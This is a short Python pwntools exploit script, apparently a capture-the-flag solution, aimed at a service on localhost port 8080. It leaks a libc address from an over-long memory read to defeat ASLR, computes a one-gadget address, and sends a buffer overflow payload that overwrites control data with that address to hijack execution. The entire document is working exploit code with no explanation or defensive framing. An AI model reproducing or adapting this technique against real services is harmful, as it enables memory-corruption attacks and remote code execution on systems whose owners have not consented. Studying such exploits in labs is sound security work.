from pwn import *
from string import printable
from time import sleep

r = remote('localhost', 8080)

r.sendline("400")
r.sendline("a"*10)

resp = r.recv()

print("len @ {}", len(resp))
libc_leak = u64(resp[104:112])
libc = libc_leak - 140629

print("libc @ {:016x}".format(libc))

# Dump the contents of memory to break ASLR 
for i in range(0,400,8):
    print("{} {:016x}".format(i, u64(resp[i:i+8])))

buffer = "a"*16
onegadget = libc + 0xe8acf

print("onegadget {:016x}".format(onegadget))

r.sendline("128")
r.send(str.encode(buffer) + p64(onegadget))
